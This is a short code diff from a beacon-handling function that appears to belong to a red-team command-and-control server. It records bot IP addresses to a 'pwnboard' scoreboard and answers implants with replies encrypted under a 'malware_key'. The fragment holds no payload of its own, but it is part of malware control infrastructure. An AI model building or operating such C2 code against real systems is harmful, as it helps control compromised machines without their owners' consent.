@@ -58,11 +58,11 @@ def heartbeat():
             """
                 This part below updates pwnboard to reflect the beacon
             """
-            # nwaddrstring = ",".join(dbmain.bot_nwaddrtostring(conn, id))
-            # if nwaddrstring != None and nwaddrstring != "" and "," in nwaddrstring and nwaddrstring != "No network address data":
-            #     ips = re.findall(r"10.\d{1,3}\.\d{1,3}\.\d{1,3}", nwaddrstring)
-            #     if len(ips) > 0:
-            #         send_update(ips[0])
+            nwaddrstring = dbget.bot_ids(conn, id)
+            if nwaddrstring != None and nwaddrstring != []:
+                ips = re.findall(r"10.\d{1,3}\.\d{1,3}\.\d{1,3}", str(nwaddrstring))
+                if len(ips) > 0:
+                    send_update(ips[0], "")
         action = {}
         action['action'] = Verb.ok.value
         return mal_encode(app.malware_key, json.dumps(action))
